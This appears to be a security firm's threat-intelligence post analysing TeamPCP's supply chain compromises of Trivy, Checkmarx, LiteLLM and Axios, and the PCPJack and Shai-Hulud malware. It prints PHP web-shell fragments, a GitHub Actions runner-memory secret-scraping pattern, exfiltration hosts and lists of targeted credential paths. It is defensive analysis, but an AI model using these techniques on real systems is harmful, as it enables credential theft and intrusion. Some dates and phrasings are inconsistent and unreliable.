---
title: "Inside Modern Supply Chain Intrusions: From CI/CD Abuse to Ecosystem-Wide Compromise"
date: 2026-06-02 11:42:53 +0200
categories: [Supply Chain Security]
tags: [investigation, supply-chain, teampcp, threat-actors]
image:
  path: Supply-chain-attacks-blo-banner-june-2026.jpg-scaled.jpeg
  alt: "Inside Modern Supply Chain Intrusions: From CI/CD Abuse to Ecosystem-Wide Compromise"
media_subpath: /assets/img/posts/inside-modern-supply-chain-intrusions-from-ci-cd-abuse-to-ecosystem-wide-compromise
toc: true
---

Modern supply chain intrusions are attacks that compromise trusted software development systems, including CI/CD pipelines, package registries, GitHub repositories, developer tools, and cloud environments. Instead of attacking one organization directly, threat actors abuse trusted dependencies, automation workflows, and stolen developer credentials to spread across entire software ecosystems.

## TeamPcP History

**TeamPCP** (also tracked as **PCPcat, DeadCatx3, UNC6780, CipherForce,** and **ShellForce**) is a threat group that first emerged in late 2025 and rapidly increased its operational activity throughout early 2026.

On **March 25, 2026**, **TeamPCP** publicly collaborated with actors associated with BreachForums and the VECT ransomware operation, claiming responsibility for the Trivy and LiteLLM supply chain compromises. The announcement linked the group to multiple high-profile software supply chain incidents targeting widely trusted developer tooling and open-source ecosystems.

![](image-134-1024x609.png)

On April 15, 2026, TeamPCP publicly collaborated with actors associated with BreachForums and the VECT ransomware operation, claiming responsibility for the Trivy and LiteLLM supply chain compromises. As part of the announcement, the VECT data leak site (DLS) listed both Trivy and LiteLLM as victims, further reinforcing the group’s attempt to publicly associate itself with the campaigns.

![](image-135-1024x907.png)
> Read our full analysis on VECT Ransomware from here: [Link](https://darkatlas.io/blog/in-depth-technical-analysis-of-vect-ransomware)

On May 15, 2026, TeamPCP announced that it had assumed a new role as co-owners of the Breached forum platform. According to the statement, the group would participate in managing multiple operational aspects of the forum, including staffing, partnerships, moderation, escrow services, premium resource access, and broader community decision-making processes.

![](image-136-1024x472.png)

On **May 11, 2026**, **Breached forum administrators and TeamPCP** jointly announced a supply chain attack competition accompanied by a **$1,000** USD prize pool. The event encouraged participants to identify, develop, or demonstrate software supply chain compromise techniques targeting developer ecosystems, package repositories, and widely trusted software components.

Alongside the announcement, the actors publicly released the source code for the Shai Hulud worm, making the malware framework openly accessible to forum members and affiliated threat actors.

![](image-137-1024x590.png)

---

## Github Actions Supply Chain Compromise

On May 20, 2026, TeamPCP and BreachForums publicly claimed responsibility for a compromise of GitHub, allegedly achieved through abuse of GitHub Actions workflows. According to the announcement, the actors stated they gained access to internal source code repositories and private development assets, including more than 4,000 repositories.

![](image-141-1024x634.png)

```
TeamPCP: Trivy → Checkmarx Cascade
      ↓
PHASE 1 - TRIVY (March 19)
Force-pushed 75/76 version tags → malicious commits
      ↓
4-STAGE PAYLOAD
      ├── /proc/*/mem scrape → steal secrets from runner memory
      ├── curl 169.254.169.254 → grab AWS IAM credentials
      ├── grep workspace → harvest Slack/Discord webhooks
      └── AES-256 + RSA-4096 encrypt → POST tpcp.tar.gz
           to scan.aquasecurtiy[.]org (45.148.10.212)
      ↓
PHASE 2 — CHECKMARX (~4 days later, March 23)
Stolen Trivy PATs reused to backdoor:
Checkmarx/ast-github-action v2.3.28 (setup.sh)
Exfil destination: checkmarx[.]zone (83.142.209.11)
Same payload. Same curl command. Different typosquat.
      ↓
HOW THE CASCADE WORKS
Trivy steals PATs from runner memory
      ↓ PATs have write access to repos using Checkmarx
Attacker pushes same stealer into Checkmarx action
      ↓ new wave, new domain, same behavior
      ↓
WHY DEFENSES FAILED
      ├── Code review & dep scanning → trusted signed action
      ├── Tag pinning → tags were force-pushed
      └── Domain reputation → typosquats were freshly registered
      ↓
WHAT WORKED - RUNTIME DETECTION
IMDS access + curl POST from same process = CRITICAL
Rules fire on behavior, not signatures or domain rep
```

![](image-142.png)

Sample of stolen github repositories

## LiteLLM / Trivy Supply Chain Compromise

On March 24, 2026, **DarkAtlas** Squad observed that **litellm** versions **1.82.7** and **1.82.8** published on **PyPI** contained malicious code absent from the upstream GitHub repository. **litellm** is a widely used open-source library with more than **95** million monthly downloads, designed to allow developers to route requests across multiple LLM providers through a unified **API**.

Both compromised versions included a backdoored file capable of decoding and executing a hidden payload immediately upon import. Version 1.82.8 further escalated the threat by deploying a malicious `.pth` file that automatically executed the payload during any Python interpreter startup, even when **litellm** itself was never imported. Version 1.82.6 remains the last known clean release.

Once activated, the payload initiated a three-stage attack chain: harvesting sensitive credentials including **SSH** **keys**, **cloud access tokens**, **Kubernetes secrets**, **cryptocurrency wallet data**, and **`.env`** files; attempting lateral movement within Kubernetes environments by deploying privileged pods across cluster nodes; and establishing persistence through a **systemd**-based backdoor designed to retrieve and execute additional binaries. Collected data was encrypted prior to exfiltration to attacker-controlled infrastructure.

![](image-96.png)

Malicious LiteLLM Code

**What Was Deleted**

```
Line 84–95: BibTeX citation block for Neubig_Zeno_GPT_Machine_2023

Line 97–101: APA citation: Zeno GPT Machine Translation Report (2023)

Line 103–109: "Get in Touch" section with GitHub Issues + Discord links
```

**Connection to Previous Code**

```
npm malware steals tokens
       ↓
Attacker uses stolen GitHub/npm credentials
       ↓
Defaces repo README to claim ownership
       ↓
May follow up with malicious package publish
```

The commit was traced to account `krrishdholakia` (**Krish Dholakia, LiteLLM/BerriAI maintainer**). The attacker pushed “**teampcp owns BerriAI**” to **182 personal repositories** simultaneously, with commit message “**teampcp update**.” This proved the attacker held the maintainer’s **personal GitHub PAT**, not just an org-level token since org access alone couldn’t have reached personal repos.

## Attack Timeline

| Date (UTC) | Event |
| --- | --- |
| Feb 20, 2026 | `hackerbot-claw` account created; begins scanning repos for exploitable `pull_request_target` workflows |
| Feb 28, 2026 | First Trivy compromise via PWN request; credentials exfiltrated |
| Mar 1, 2026 | Aqua Security attempts containment credential rotation incomplete |
| **Mar 19, 17:43** | **Main strike:** TeamPCP force-pushes 75/76 tags in `aquasecurity/trivy-action` + all 7 tags in `setup-trivy` via compromised `aqua-bot` service account |
| Mar 19, 18:22 | Backdoored Trivy v0.69.4 published to GitHub Releases, Docker Hub, GHCR, ECR |
| Mar 20, 05:40 | Trivy-action compromise window closes (~12 hours) |
| Mar 20, 20:45 | CanisterWorm detected spreading across npm 47+ packages compromised |
| Mar 22, 20:31 | TeamPCP defaces all 44 repos in `aquasec-com` GitHub org in a scripted 2-minute burst |
| Mar 22 | Docker Hub images `0.69.5` and `0.69.6` pushed with same stealer payload |
| **Mar 23, 02:53** | **Checkmarx wave begins:** Malicious `ast-results` v2.53.0 and `cx-dev-assist` v1.7.0 published to OpenVSX via `ast-phoenix` account |
| Mar 23, 12:58 | All 35 tags of `Checkmarx/kics-github-action` force-pushed via compromised `cx-plugins-releases` account |
| Mar 23, 15:41 | Checkmarx reports OpenVSX issue resolved |
| Mar 23, 16:50 | KICS GitHub Action taken down after user report |
| Mar 23, 22:25 | Sysdig reports `Checkmarx/ast-github-action` v2.3.28 also compromised |
| **Mar 24, 08:30** | **LiteLLM wave:** Trojanized `litellm` v1.82.7 and v1.82.8 published to PyPI using stolen credentials |
| Mar 24, 11:25 | PyPI quarantines malicious LiteLLM versions |

---

## Axios Supply Chain Compromise

On **March 31, 2026**, two malicious versions of axios (**1.14.1 and 0.30.4**) were published to the npm registry through my compromised account. Both versions injected a dependency called **`plain-crypto-js@4.2.1`**that installed a remote access trojan on macOS, Windows, and Linux.

![](image-139-1024x498.png)

The attacker published two compromised Axios releases, versions **`1.14.1` and `0.30.4`**, without directly modifying the original Axios source code. Instead, the malicious functionality was introduced indirectly through the package dependency chain by injecting `plain-crypto-js@4.2.1` into the **`package.json`** file as a runtime dependency.

```
ATTACKER
      ↓
Step 1: npm account takeover
Attacker hijacks the jasonsaayman npm account
and changes its email from jasonsaayman@gmail.com to ifstap@proton.me
      ↓
Step 2: Publish malicious axios@1.14.1 and axios@0.30.4
1.14.1 published at 00:21 UTC, 0.30.4 at 01:00 UTC
Both add plain-crypto-js as a dependency:
+ "plain-crypto-js": "^4.2.1"

VICTIM
      ↓
Step 3: Victim runs npm install axios
npm resolves plain-crypto-js@4.2.1
Its postinstall hook runs setup.js
Detects OS and downloads a platform-specific payload
      ↓
      ├── macOS ──────────────────────────────────────┐
      │   BINARY      Mach-O universal (C++)           │
      │   DROPPER     AppleScript                      │
      │   DISGUISE    Fake Apple daemon name           │
      │   PERSISTENCE None built-in                   │
      │                                               │
      ├── Windows ─────────────────────────────────── │
      │   PAYLOAD     PowerShell .ps1                  │
      │   DROPPER     VBScript                         │
      │   DISGUISE    Windows Terminal                 │
      │   PERSISTENCE Run key: MicrosoftUpdate [!]    │
      │   BUGS        work() never called [!]          │
      │                                               │
      └── Linux ───────────────────────────────────── │
          PAYLOAD     Python script                    │
          DROPPER     Direct curl + nohup              │
          DISGUISE    None                             │
          PERSISTENCE None built-in                   │
          BUGS        os.getlogin() crash +            │
                      broken binary exec [!]           │
      ↓
SHARED ACROSS ALL PLATFORMS
C2 Protocol: sfrclak[.]com:8000
HTTP POST with base64-encoded JSON
Hardcoded IE8 User-Agent
60-second beacon loop

FirstInfo   Directory listings of ~, ~/Desktop, ~/Documents, ~/.config
BaseInfo    Hostname, user, OS, timezone, CPU, process list (every 60s)
kill        Terminate the RAT
peinject    Drop and execute binary from base64 payload
runscript   Run arbitrary shell, PowerShell, or Python code
rundir      Enumerate a remote directory
```

## Attack Timeline

| Time (UTC) | Event |
| --- | --- |
| ~2 weeks before Mar 31, 2026 | Social engineering campaign initiated against the Axios lead maintainer |
| Mar 30, 05:57 | `plain-crypto-js@4.2.0` published to npm registry |
| Mar 31, 00:21 | `axios@1.14.1` published with `plain-crypto-js@4.2.1` injected as a runtime dependency |
| ~Mar 31, 01:00 | `axios@0.30.4` published with the same malicious dependency |
| ~Mar 31, 01:00 | First external detections of suspicious activity reported |
| ~Mar 31, 01:00 | Community members open issues reporting compromise; attacker deletes them via compromised account |
| Mar 31, 01:38 | Collaborator DigitalBrainJS opens PR `chore(ci): add deprecate action (#10591)`, flags deleted issues, and contacts npm security |
| Mar 31, 03:15 | Malicious Axios versions removed from npm registry |
| Mar 31, 03:29 | `plain-crypto-js` removed from npm registry |

## Tool Sets Code Analysis

The infection chain begins with `bootstrap.sh`, a shell script specifically crafted for Linux-based environments. The script primarily functions as an initial staging mechanism, responsible for preparing the execution environment and retrieving additional payloads from remote infrastructure.

During execution, `bootstrap.sh` defines several operational variables, most notably `PAYLOAD_HOST`, which points to **`hxxps://spm-cdn-assets-dist-2026[.]s3[.]us-east-2[.]amazonaws[.]com`.** The domain leverages a legitimate **Amazon Simple Storage Service (S3)** endpoint, likely provisioned by the threat actor to blend malicious traffic with trusted cloud infrastructure and reduce detection likelihood. By abusing reputable cloud-hosted services for payload delivery, the attacker increases operational resilience while complicating traditional network-based detection and blocking efforts.

![](image-98.png)

`bootstrap.sh` functions as the primary dropper and environment preparation component of the infection chain. Its responsibilities extend beyond simple payload delivery, incorporating anti-analysis checks, dependency installation, persistence establishment, and orchestration of the subsequent attack stages.

The script begins by creating a hidden working directory at **`/var/lib/.spm/`**, which serves as the central storage location for downloaded payloads and runtime artifacts. It then performs a public IP validation check against an operator-controlled blocklist, likely intended to prevent accidental infection of the attacker’s own infrastructure, security researchers, or previously compromised systems.

![](image-99.png)

To maintain operational exclusivity, the script actively searches for and removes processes, services, containers, and filesystem artifacts matching naming conventions associated with TeamPCP or PCPcat. This behavior suggests either internal tooling conflicts, infrastructure recycling, or attempts to eliminate competing malware instances.

![](image-100-1024x120.png)

The dropper proceeds to ensure the target environment satisfies runtime requirements by installing Python 3.6 or later through any available package manager, including **`apk`, `apt`, `dnf`, `pacman`, `yum`, or `zypper`**. Once Python is available, it creates an isolated virtual environment and installs the required dependencies: **`requests`, `cryptography`, and `pyarrow`.**

![](image-101-1024x392.png)

Following environment preparation, the script retrieves six Python modules from the attacker-controlled S3 infrastructure in a predefined sequence: **`worm.py`, `parser.py`, `lateral.py`, `crypto_util.py`, `cloud_ranges.py`, and `cloud_scan.py`**. The downloaded components are subsequently renamed to their designated on-disk filenames to support later execution stages and modular orchestration.

![](image-102-1024x154.png)

Persistence mechanisms vary depending on privilege level. When executed with root privileges, the script installs a malicious `systemd` service named `sys-monitor.service`, configured to continuously execute `monitor.py` (internally corresponding to **`worm.py`**), which acts as the central orchestrator component. In lower-privileged environments, the malware instead deploys two cron jobs: one periodically verifies whether `monitor.py` is active every five minutes, while the second relaunches the process if it is found inactive.

![](image-104.png)

After persistence is successfully established, the script launches `monitor.py` to initiate the next attack phases before removing itself from disk using `rm -f "$0"`, reducing forensic visibility and complicating post-compromise analysis.

![](image-106-1024x68.png)

The logic specifically targeting TeamPCP-related artifacts is particularly notable. Nearly all referenced files, services, process names, and containers have previously been publicly associated with TeamPCP operations, while references to `BORING_SYSTEM` remain limited and only sparsely documented. Initially, this behavior raised the possibility that the toolset was designed as a remediation utility intended to remove existing TeamPCP infections from compromised systems.

---

## PCPJack Malware Architecture and Runtime Orchestration

The infection workflow begins with `bootstrap.sh`, which ultimately launches the primary orchestrator component, `monitor.py` (also referenced internally as “`worm.py`“). This orchestrator acts as the central coordination layer for the malware framework, importing and managing multiple purpose-built modules responsible for credential parsing (`utils.py`), lateral movement (`_lat.py`), command-and-control encryption (`_cu.py`), cloud IP range discovery (`_cr.py`), and cloud environment scanning (`_csc.py`).

![](image-107.png)

Rather than allowing each module to independently resolve its own dependencies, the framework relies on runtime dependency injection performed directly by the orchestrator. Shared references and operational handles are dynamically passed between components, ensuring that credential access, lateral movement functionality, and cloud scanning logic all operate through centralized objects without exposing explicit inter-module imports. This architecture reduces static linkage between modules while enabling coordinated execution across the framework.

Notably, the cloud scanning component (`_csc.py`) receives its required functionality including the lateral movement engine, cloud range resolution functions, and credential parsing capabilities directly from the orchestrator during runtime initialization. This modular design intentionally minimizes the visibility of each individual component in isolation. As a result, no single imported module exposes the complete operational workflow, requiring analysts to examine `monitor.py` in order to fully reconstruct the malware’s dependency graph and execution logic.

![](image-108.png)

The malware also incorporates basic string obfuscation techniques intended to conceal operational infrastructure and sensitive constants. Critical strings are embedded within the source code as hex-encoded blobs rather than plaintext values. During execution, the scripts recover the original content through a helper function named `_d()`, located near the beginning of each Python module, which decrypts the encoded strings at runtime.

![](image-109.png)

The decryption routine operates by XORing each byte against the MD5 hash of the string `urllib3.poolmanager`, a deliberately chosen identifier intended to resemble a legitimate Python networking library reference. This technique appears designed to obscure infrastructure indicators and hinder rapid static analysis by defenders.

![](image-110.png)

Despite these obfuscation efforts, the operator demonstrated inconsistent operational security practices. Several highly sensitive values remained exposed in plaintext, including the Telegram bot token embedded within `bootstrap.sh` and the credential decryption key hardcoded inside `crypto_util.py`. These oversights significantly weaken the effectiveness of the malware’s obfuscation strategy and provide defenders with valuable opportunities for attribution, tracking, and infrastructure analysis.

## Credential Theft

On each compromised host, (`monitor.py` A.K.A **Worm.py)** initiates a comprehensive credential harvesting routine designed to collect sensitive data from both system configuration files and active runtime environments. The malware targets a wide range of artifacts, including `.env` files, application configuration files, environment variables containing secrets or API credentials, database and SMTP authentication data, SSH private keys, and host connection metadata extracted from `known_hosts`, `~/.ssh/config`, and shell history files.

![](image-111-1024x804.png)

In cloud-native environments, the malware additionally attempts to retrieve **AWS** Instance Metadata Service (**IMDS**) credentials, **Kubernetes** service account tokens, and **Docker** secrets stored under **`/run/secrets/`.** The credential collection scope also extends to cryptocurrency assets, specifically targeting **Bitcoin** `wallet.dat` files, Ethereum keystores, and Solana private key material.

![](image-112-1024x409.png)

To expand collection coverage, the malware performs recursive filesystem scans across high-value directories including **`/etc`, `/home`, `/opt`, `/root`, `/srv`, `/var/lib`, and `/var/www`**, searching for configuration files, embedded secrets, and exposed credentials. A dedicated component, `_mgr`, further enhances this process by parsing Git repository history in an attempt to recover deleted or previously committed secrets that may no longer exist within active source code. All harvested data is subsequently normalized and processed through `utils.py`.

![](image-113-1024x287.png)

## Target Selection & Propagation

Following credential extraction, the malware evaluates whether the target system has already been infected by checking for the presence of **`/var/lib/.spm/worm.py` or `/var/lib/.spm/monitor.py`**. If no prior installation is detected, the malware retrieves and executes `bootstrap.sh` directly from the attacker-controlled payload infrastructure.

![](image-114-1024x168.png)

Propagation targets are sourced from Parquet datasets downloaded from Common Crawl, a legitimate nonprofit organization that archives large-scale web scan data commonly used for search indexing and AI model training. The malware extracts download locations from obfuscated variables named `_CI` and `_CB`, which conceal the infrastructure used to obtain the datasets.

![](image-115.png)
![](image-116-1024x248.png)

The propagation logic specifically selects Parquet files containing `url_host_name` columns and iterates through the discovered hostnames as potential targets. To distribute scanning activity efficiently across infected nodes, each `monitor.py` instance processes only a defined subset of Parquet files determined either by date-based segmentation or through a seeded index value stored in `SPM_SEED_IDX`. This mechanism allows the operator to achieve broad distributed coverage without requiring continuous centralized task coordination.

![](image-117-1024x273.png)

To minimize redundant scanning operations, the malware maintains an in-memory deduplication structure referenced as `_sh`, which tracks previously processed hosts. The set is capped at approximately **15 million** entries, enabling large-scale propagation campaigns while limiting repeated targeting activity across the distributed botnet infrastructure.

![](image-118-1024x442.png)

## Command & Control (C2) Via Telegram

The malware framework leverages Telegram as its primary command-and-control (C2) channel, using a dual-channel communication model for both telemetry exfiltration and tasking. Compromised hosts periodically upload collected data to a designated Telegram channel, while simultaneously polling a separate channel for operator instructions embedded in a pinned message structure.

This design allows the operator to maintain persistent control without traditional infrastructure hosting C2 panels or dedicated servers. Command execution is lightweight and message-driven, reducing infrastructure footprint while blending into legitimate encrypted messaging traffic.

Two primary operational commands are observed:

- **RUN**: Downloads a remote module from attacker-controlled payload storage, writes it locally as `run_script.py`, and executes it immediately on the infected host. This enables dynamic functionality expansion without modifying the core implant.

![](image-119-1024x273.png)

- **PARQUET**: Assigns or updates the processing index for distributed scanning tasks. This allows the operator to override or reallocate Parquet file ranges previously assigned to a node, effectively reshaping target coverage across the botnet in real time.

![](image-120-1024x660.png)

## Credential Extraction Module

The `utils.py` module is responsible for parsing and classifying harvested credentials using a broad set of regular expressions designed to identify sensitive secrets across financial, cloud, messaging, and enterprise platforms. Extracted data is normalized and grouped by service type to facilitate structured exfiltration and downstream exploitation.

![](image-121.png)

### Targeted Credential Categories

**Finance & Enterprise Platforms**

- Binance
- Bitcoin
- Coinbase
- Ethereum
- Gemini
- Infura
- Kraken
- KuCoin
- OKX
- Solana
- Stripe

**SMTP & Bulk Messaging Services**

- Amazon SES
- 126.com
- 163.com
- qq.com
- Gmail
- Mailchimp
- Mailgun
- Mailjet
- Mandrill
- Microsoft Office 365 / Outlook
- SendGrid
- Twilio
- Yandex

**Web & Cloud Services**

- AWS (Access Key ID, Secret Access Key)
- Databases (generic URLs, usernames, passwords)
- Generic SMTP configurations
- GitHub tokens and secrets
- PHP application keys and credentials
- Slack API tokens
- SSH private keys
- WordPress credentials (database passwords, SMTP configuration, W3TC cache secrets)

`utils.py` functions as a broad-spectrum credential classifier, enabling structured exfiltration across a wide range of modern and legacy service ecosystems.

## web shell backdoor

![](image-122-1024x71.png)

**Password gate** – checks if the URL parameter `k` equals `spm0x`.

```
($_GET["k"]??"")==="spm0x"
```

---

**Evasion** – if the wrong password is given, it returns a fake 404 to hide its existence.

```
http_response_code(404); die();
```

---

**Command input** – accepts a command via POST or GET parameter `c`.

```
$c = $_POST["c"] ?? $_GET["c"] ?? "";
```

---

**Execution** – decodes the base64-encoded command and runs it directly on the server OS.

```
system(base64_decode($c));
```

---

## Network Lateral Movement

The `lateral.py` module (internally referenced as `_lat.py`) is responsible for internal reconnaissance, credential-driven propagation, and post-compromise expansion throughout the victim environment. To reduce noise and minimize the likelihood of repeated network detections, the module is designed to execute only once per host. Upon completion, it writes a marker file named `lateral_done` within the malware working directory; if the marker already exists, execution terminates immediately.

![](image-126-1024x459.png)
![](image-123-1024x198.png)
![](image-124-1024x197.png)

---

## Kubernetes Propagation

The Kubernetes propagation routine, `_lk`, targets environments where containers are running with mounted Kubernetes service account tokens. The module authenticates directly to the **Kubernetes API** server using the local service account token, then enumerates **namespaces, pods, Secrets, and ConfigMaps** throughout the cluster.

For each accessible container, the malware executes commands intended to:

- Extract credentials from known secret storage locations
- Harvest SSH private keys
- Query the AWS Instance Metadata Service (IMDS)

The IMDS collection logic succeeds only in environments where IMDSv2 enforcement is absent or improperly configured, highlighting the malware’s focus on exploiting weak cloud security implementations.

Even when direct pod execution is restricted through **Kubernetes Role-Based Access Control (RBAC)**, `_lk` remains capable of extracting sensitive data by reading Kubernetes Secrets and **ConfigMaps** directly through the API and base64-decoding their contents.

![](image-125-1024x100.png)

The module also attempts container escape operations by deploying containers that mount the host filesystem into the container runtime environment, enabling direct interaction with the underlying host operating system and greatly expanding attacker control.

---

## Docker Propagation

The Docker propagation component, **`_ld`,** checks for access to the local Docker management socket located at `/var/run/docker.sock`, then scans the surrounding network for exposed Docker daemons listening on ports `2375` or `2376`.

![](image-127-1024x137.png)

When a reachable Docker API is identified, the malware:

- Enumerates running containers
- Executes credential harvesting routines against those containers
- Attempts filesystem-level access through bind mounts

In remote Docker environments, the spreader mounts the host root filesystem into the container under `/host`, effectively enabling a container escape and allowing the malware to interact directly with the remote host operating system.

---

### Redis Exploitation & Persistence

When Redis services are identified, the `_rec` module extracts configuration information and enumerates database keys using the Redis `KEYS` command. The malware searches for secrets, tokens, passwords, and API credentials stored within Redis datasets and retrieves associated values through `GET` operations.

Persistence is established through `_rwc`, which abuses Redis configuration rewriting functionality to create a cron-based persistence mechanism. The resulting cron task executes `bootstrap.sh` every five minutes with root privileges, ensuring re-infection and long-term persistence.

### Additional Lateral Movement Targets

The malware also targets several additional enterprise and cloud-native technologies:

- **RayML Clusters**: Scans port `8265`, submits Python jobs through the Ray API, extracts credentials, and deploys `bootstrap.sh`
- **MongoDB**: Scans port `27017`, enumerates databases, and attempts credential extraction
- **SSH Propagation (**`_ls`**)**:

![](image-129.png)

- Parses **`~/.ssh/known_hosts`, `~/.ssh/config`, and `.bash_history`**
- Searches harvested credential stores and SSH key locations
- Uses credentials collected in `harvest.jsonl`
- Attempts authentication against discovered SSH targets
- Deploys `bootstrap.sh` upon successful access

![](image-130-1024x490.png)

This propagation strategy allows the malware to pivot laterally across infrastructure using both cloud-native APIs and traditional administrative protocols.

![](image-128-1024x488.png)

---

## Credential Encryption & Exfiltration

The **`crypto_util.py`** module (also referenced internally **as `_cu.py`** and imported **as `_crypto`**) handles encryption of harvested credentials before exfiltration. The module is invoked directly by **`monitor.py`** prior to transmitting stolen data to attacker-controlled Telegram infrastructure.

### Encryption Workflow

The `encrypt_message` function performs the following operations:

- Generates a fresh **X25519** keypair for each message chunk
- Performs Elliptic Curve Diffie-Hellman (ECDH) using a hardcoded attacker public key:
  - `_RPK = "6d4imqQ/s/GfQCVcybdcjfTe/PMYHtZN8ZGHnEXSbRo="`

![](image-131-1024x256.png)

- Uses the resulting shared secret directly as the encryption key for ChaCha20-Poly1305
- Splits encrypted output into approximately 2800-byte chunks to remain within Telegram’s message size limitations
- Constructs encrypted payloads by concatenating:
  - Ephemeral public key (32 bytes)
  - Random nonce (12 bytes)
  - Ciphertext
- Base64-encodes the resulting structure and prepends a 🔒 emoji marker before transmission

![](image-132-1024x214.png)

---

## Encryption Weaknesses

The malware includes a significant operational weakness: if the `cryptography` library is unavailable on the infected system, the encryption function silently falls back to plaintext transmission. In such cases, harvested credentials may be exfiltrated without any encryption protection.

Additionally, the `decrypt_message` function requires possession of the private key corresponding to `_RPK`. The module’s `__main__` testing block contains a matching test keypair (`PRIVATE_KEY`), suggesting that researchers who obtain access to the attacker’s Telegram channel may be capable of decrypting captured credential archives.

During testing, the Telegram API returned responses indicating that the embedded bot token was invalid, despite the malware remaining actively distributed at the time. This inconsistency may indicate rapid infrastructure rotation, temporary token revocation, operational errors by the actor, or incomplete deployment staging during active campaigns.

![](image-133-1024x455.png)

---

## Shai-Hulud Campaign

On May 12, 2026, a GitHub repository attributed to several likely compromised user accounts (identified through GitHub search activity) was observed containing what appears to be the full source code of the **Shai-Hulud** offensive framework, which has been attributed to**TeamPCP**.

![](image-175-1024x590.png)

The repository’s README explicitly includes the statements: *“**Love – TeamPCP**”* and *“**Change keys and C2 as needed**.”* These notes suggest intentional public release or controlled disclosure of an operational malware framework rather than accidental exposure.

The codebase is described as a modular **TypeScript/Bun**-based toolkit designed for credential harvesting, supply chain manipulation, and encrypted data exfiltration. It targets both **CI/CD** pipelines and developer endpoints, aligning with previously observed activity affecting modern software delivery environments.

All three commits in the repository use spoofed timestamps set to `2099-01-01` and are authored under the identity `TeamPCP_OSS <TeamPCP>`, indicating deliberate timeline manipulation to obscure the true development history.

![](image-144.png)

---

## Tool overview

```
Shai-Hulud - Component Architecture
      ↓
LOADERS (Stage-1 Droppers)
      ├── BASH_LOADER.sh
      ├── PYTHON_LOADER.py
      └── config.mjs
      Download Bun runtime → launch bundled JS payload
      ↓
PROVIDERS (Credential Collection)
      ├── Filesystem
      ├── Shell environment
      ├── GitHub Actions runners
      ├── AWS
      ├── Kubernetes
      └── HashiCorp Vault
      Each module targets one specific secret source
      ↓
COLLECTOR (Buffered Ingestion)
      Batches harvested secrets before exfiltration
      Default flush threshold: 100KB
      ↓
DISPATCHER (Encrypted Delivery)
      Manages ordered failover across sender backends
      ↓
SENDERS (Exfiltration Channels)
      ├── HTTPS POST → C2 domain
      └── GitHub repos → encrypted dead-drops
      ↓
MUTATORS (Supply Chain Propagation)
      ├── Poison GitHub repository branches
      └── Publish backdoored npm packages
```

---

## Tool Component

```
LOADERS → stage-1 droppers
      BASH_LOADER.sh / PYTHON_LOADER.py / config.mjs
      download Bun runtime → launch bundled JS payload
              ↓
PROVIDERS → harvest secrets per source
      filesystem · shell env · GitHub Actions
      AWS · Kubernetes · HashiCorp Vault
              ↓
COLLECTOR → buffer & batch
      accumulates results until flush threshold (default: 100KB)
      then hands off to dispatcher
              ↓
DISPATCHER → encrypted delivery
      ordered failover across multiple sender backends
              ↓
SENDERS → exfiltration channels
      ├── HTTPS POST → C2 domain
      └── GitHub repos → encrypted dead-drops
              ↓
MUTATORS → propagate the chain
      ├── poison GitHub repository branches
      └── publish backdoored npm packages
```

---

![](image-145-1024x262.png)

---

## Shell environment

The `ShellService` component executes the command `gh auth token` to retrieve authentication tokens cached by the GitHub CLI. In addition to extracting GitHub access credentials, the service captures the complete `process.env` object from the execution environment.

This behavior enables the malware to harvest sensitive runtime secrets commonly exposed within CI/CD pipelines, including cloud access credentials, API keys, deployment tokens, and infrastructure secrets injected as environment variables during automated workflow execution. In environments where build systems rely heavily on temporary secrets and runtime credential injection, access to `process.env` can provide broad visibility into deployment infrastructure, internal services, and connected cloud platforms.

![](image-146.png)

---

## Credential Harvesting

The toolkit implements broad credential collection capabilities designed to rapidly extract sensitive data from developer workstations, CI/CD runners, cloud-native infrastructure, and local user environments. Three credential providers are executed immediately during startup as “quick results” collectors before the heavier cloud-targeting modules and extended reconnaissance providers are initialized.

## Filesystem Scanning

The `FileSystemService` component maintains extensive OS-specific targeting lists containing more than 100 sensitive file paths and credential locations. The scanning logic is tailored primarily for Linux and macOS environments commonly used in cloud-native development workflows.

### Targeted Credential Categories

**Cloud Credentials**

- `~/.aws/credentials`
- `~/.azure/accessTokens.json`
- `~/.config/gcloud/credentials.db`

**SSH Material**

- `~/.ssh/id_*`
- `~/.ssh/config`
- `~/.ssh/known_hosts`

**Kubernetes**

- `~/.kube/config`
- `/var/run/secrets/kubernetes.io/serviceaccount/token`

**Cryptocurrency Wallets**

- Bitcoin
- Ethereum
- Monero
- Litecoin
- Dogecoin
- Zcash
- Electrum
- Exodus
- Ledger Live

**Messaging & Collaboration Platforms**

- Discord
- Slack
- Telegram
- Signal
- Element

**Package Registry Credentials**

- `.npmrc`
- `.pypirc`
- `.yarnrc`

**AI Development Tooling**

- `.claude.json`
- `.claude/mcp.json`
- `.kiro/settings/mcp.json`

**Additional Sensitive Artifacts**

- Shell history files
- VPN configurations
- Docker configuration files
- Git credentials
- `.env` files

### Runtime Expansion & Collection Logic

Files are read with a maximum collection threshold of approximately 5 MB per file to limit resource consumption and reduce operational noise during harvesting. The framework also supports recursive glob expansion at runtime, allowing wildcard-based collection patterns such as:

- `**/.env`
- `~/.docker/*/config.json`

This enables the malware to dynamically discover nested secrets and configuration files across complex directory structures without requiring hardcoded paths for every environment.

The breadth of targeted artifacts demonstrates a strong focus on developer infrastructure, cloud-native environments, cryptocurrency assets, and CI/CD ecosystems, indicating that the toolkit is optimized for environments where credentials, deployment secrets, and infrastructure access tokens are routinely stored locally or injected during automated workflows.

![](image-147-1024x744.png)

---

## GitHub Actions Runner Memory Extraction

One of the most notable capabilities attributed to the framework is its ability to extract secrets directly from GitHub Actions runner memory. This technique was among the earliest behaviors highlighted in open-source reporting associated with TeamPCP operations.

The `GitHubRunner` provider first verifies that execution is occurring inside a Linux-based GitHub Actions runner environment. Once validated, the malware executes **`python_util.py`** through the Python interpreter via standard input while leveraging elevated privileges through `sudo`.

The Python logic identifies the active `Runner.Worker` process by enumerating `/proc/*/cmdline` entries and locating the GitHub Actions worker process. After identifying the target PID, the script accesses both:

- `/proc/<pid>/maps`
- `/proc/<pid>/mem`

The `/proc/<pid>/maps` file is parsed to enumerate readable memory regions, while `/proc/<pid>/mem` is used to directly access the memory contents associated with those regions. The script iterates through readable mappings, seeks to the associated memory offsets, and extracts raw process memory data.

The collected memory output is then piped through `grep -aoE` using regular expressions designed to identify JSON structures associated with GitHub Actions secret storage, specifically patterns resembling:

```
"<key>":{"value":"<value>","isSecret":true}
```

This technique effectively bypasses GitHub Actions’ secret masking protections by extracting secrets directly from process memory before masking or redaction occurs within workflow logs or console output.

By targeting the runtime memory of the **`Runner.Worker`** process itself, the framework gains access to secrets actively loaded during workflow execution, including:

- **cloud access credentials**
- **deployment tokens**
- **API keys**
- **CI/CD secrets**
